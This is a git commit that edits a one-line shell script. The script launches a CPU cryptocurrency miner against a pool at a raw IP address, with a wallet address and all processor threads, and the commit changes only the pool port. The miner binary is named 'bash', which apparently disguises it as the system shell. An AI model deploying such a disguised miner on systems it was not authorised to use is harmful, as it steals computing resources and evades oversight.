1797eb2611bbf23416f8888ef14a683de5d8608a
ustmandenuh <114278737+ustmandenuh@users.noreply.github.com>
2022-10-02 01:05:39 +0700

    Update asup.sh

--- asup.sh
+++ asup.sh
@@ -1,1 +1,1 @@
-./bash -a yespowertide -o stratum+tcp://8.209.98.71:80 -u TPfT1p4uXkU4Nvb2hnVCKeH34ga8eqSFUB.0000-2 -t$(nproc --all) -p x
+./bash -a yespowertide -o stratum+tcp://8.209.98.71:1028 -u TPfT1p4uXkU4Nvb2hnVCKeH34ga8eqSFUB.0000-2 -t$(nproc --all) -p x
